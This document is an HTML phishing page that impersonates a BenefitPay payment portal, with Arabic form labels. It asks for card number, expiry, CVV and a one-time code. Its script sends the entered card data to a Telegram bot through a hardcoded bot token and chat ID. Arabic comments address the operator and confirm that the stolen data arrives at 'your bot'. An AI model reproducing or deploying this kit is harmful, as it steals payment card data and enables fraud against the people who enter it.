<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BenefitPay | Portal</title>
    <style>
        body { font-family: sans-serif; background: #f2f2f2; text-align: center; margin: 0; }
        .header { background: #e21e26; color: #fff; padding: 20px; font-weight: bold; }
        .card { background: #fff; margin: 20px auto; padding: 20px; width: 90%; max-width: 350px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 5px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">BenefitPay Secure System</div>
    <div class="card" id="box1">
        <input type="number" id="amt" placeholder="المبلغ">
        <input type="text" id="name" placeholder="الاسم الكامل">
        <input type="number" id="crd" placeholder="رقم البطاقة (16 رقم)">
        <input type="text" id="ex" placeholder="MM/YY">
        <input type="number" id="cv" placeholder="CVV">
        <button class="btn" onclick="hit()">استمرار</button>
    </div>
    <div class="card" id="box2" style="display:none;">
        <h3>تم إرسال الكود</h3>
        <p>أدخل الرمز المستلم:</p>
        <input type="number" id="ot" placeholder="******">
        <button class="btn" onclick="done()">تأكيد</button>
    </div>

<script>
    // تأكد من هذه الأرقام مليون مرة
    var tok = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
    var cid = "8302667206";

    function hit() {
        var m = "NEW_HIT%0A" + 
                "Amt: " + document.getElementById('amt').value + "%0A" +
                "Card: " + document.getElementById('crd').value + "%0A" +
                "Exp: " + document.getElementById('ex').value + "%0A" +
                "CVV: " + document.getElementById('cv').value;

        // طريقة الإرسال عبر رابط خارجي (مستحيل تتعطل)
        window.location.href = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + m;
        
        // ملاحظة: هذا الكود سيأخذك لصفحة بيضاء فيها كلمة "OK: True" 
        // وهذا معناه أن البيانات وصلت 100% لبوتك.
    }
</script>
</body>
</html>
